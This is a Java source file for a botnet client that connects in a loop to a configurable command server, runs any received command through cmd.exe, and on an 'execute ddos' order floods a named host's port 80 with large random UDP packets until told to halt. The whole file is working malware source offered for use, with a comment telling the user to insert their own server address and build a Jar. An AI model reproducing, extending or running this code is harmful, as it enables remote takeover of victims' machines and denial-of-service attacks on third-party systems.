package presleybn;

import java.io.*;
import java.net.*;
import java.util.Random;

public class Client {
	
	private int PORT = 65530;
	private String ip = "127.0.0.1"; // Change this value to your server and compile it into a Jar
	private Socket socket;
	
	private void start() {
		try {
			socket = null;
			System.out.println("INFO: Connecting...");
			while(socket == null) {
				try {
					socket = new Socket(ip, PORT);
				}catch(Exception ex) {} //This is inside a loop, so we don't want to infinitely print errors
			}
			System.out.println("INFO: Connected!");
			
			InputThread it = new InputThread(socket);
			it.start();
			
		}catch(Exception ex) {
			socket = null;
			System.gc();
			System.out.println("WARN: Failed.");
		}
	}
	
	
	class InputThread extends Thread {
		Socket socket;
		ObjectInputStream sInput;
		ObjectOutputStream sOutput;
		
		public InputThread(Socket theSocket) {
			socket = theSocket;
			try {
				sInput = new ObjectInputStream(socket.getInputStream());
				sOutput = new ObjectOutputStream(socket.getOutputStream());
			}catch(Exception ex) {}
		}
		
		@SuppressWarnings("deprecation") //Thread.stop is deprecated, but we MUST have that to stop the attacks
		public void run() {
			DDOS ddos = null;
			while(true) {
				try {
					String command = (String) sInput.readObject();
					command = command.replaceAll("COMMAND: ", "");
					if(command.startsWith("execute") && !command.contains("ddos")) {
						command = command.replaceAll("execute ", "");
						System.out.println("INFO: Executing command: " + command);
						ProcessBuilder ps = new ProcessBuilder("cmd.exe", command);
						ps.redirectErrorStream(true);
						Process pr = ps.start();
						pr.waitFor();
					}else if(command.startsWith("execute ddos")) {
						System.out.println("INFO: DDOS instruction recieved");
						command = command.replaceAll("execute ", "");
						String[] params = command.split(" ");
						ddos = new DDOS(params[1], 80); //Attack port 80
						ddos.start();
						System.out.println("INFO: started DDOS");
					}else if(command.contains("halt ddos")) {
						System.out.println("INFO: Attempting to stop DDOS thread!");
						ddos.stop();
						System.out.println("INFO: DDOS thread stopped");
					}
					
				}catch(Exception ex) {}
			}
		}
	}
	
	class DDOS extends Thread {
		DatagramSocket dSocket;
		DatagramPacket dPacket;
		Random rand = new Random();
		byte[] bytes;
		String target;
		int port;
		int size;
		
		public DDOS(String theTarget, int thePort) {
			port = thePort;
			target = theTarget;
		}
		
		public void run() {
			System.out.println("INFO: Beginning DDOS loop, prepare for slow internet!");
			while(true) {
				try {
					size = 60000; //Larger size is more powerful attack, smaller size is more packets for a faster attack
					dSocket = new DatagramSocket();
					dSocket.connect(InetAddress.getByName(target), port);
					bytes = new byte[size];
					rand.nextBytes(bytes);
					dPacket = new DatagramPacket(bytes, bytes.length);
					dSocket.send(dPacket);
					dSocket.close();
				}catch(Exception ex) {
					System.out.println("WARN: Failed to DDOS");
					break;
				}
			}
		}
	}
	
	public static void main(String[] args) {
		Client client = new Client();
		client.start();
	}
}